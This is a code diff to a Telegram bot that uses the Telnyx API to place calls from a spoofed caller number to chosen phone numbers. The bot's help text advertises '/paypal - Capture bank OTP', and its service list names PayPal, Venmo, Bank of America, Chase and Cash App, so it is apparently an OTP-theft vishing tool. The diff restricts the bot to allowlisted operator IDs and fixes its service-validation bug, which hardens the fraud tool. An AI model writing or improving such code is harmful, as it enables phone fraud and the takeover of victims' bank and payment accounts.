@@ -14,9 +14,25 @@ const express = require('express');
 const app = express();
 const port = process.env.PORT || 3000;
 
+// Defined a list of allowed users (using IDs) 
+const allowedUsers = [123456789]
+
+// Defined a middleware function that checks the user 
+const userFilter = (ctx, next) => {
+   // Get the user from the context 
+   const user = ctx.from 
+   // Check if the user is in the list of allowed users 
+   if (allowedUsers.includes(user.id)) {
+      // If yes, call the next middleware 
+      return next() 
+   } else { 
+      // If no, ignore the message 
+      return null 
+   } 
+}
 
 async function call (spoof, customer_number, ctx, service, digit){
-   console.log(ctx, 'first yayyyy')
+   console.log('command is from: ', ctx.from)
    // Use the Telnyx API to create a new call
    try {
       await bot.telegram.sendMessage(ctx.chat.id, `📞 Call has Started...`, {
@@ -84,11 +100,11 @@ bot.help(ctx => ctx.reply(`
 ➤ /paypal - Capture bank OTP\n
 `))
 
-bot.command('call', ctx => {
+bot.command('call', userFilter, ctx => {
    const [command, spoof, number, service, digit ]= ctx.message.text.split(' ');
    const serviceList = [ 'paypal', 'venmo', 'boa', 'chase', 'bank', 'cashapp' ]
 
-   if( !number || !service.includes(service) ){
+   if( !number || !serviceList.includes(service) ){
       bot.telegram.sendMessage(ctx.chat.id, `❌ Error  : Invalid number or service not available`, {}).then(() => {})
    }
    else{
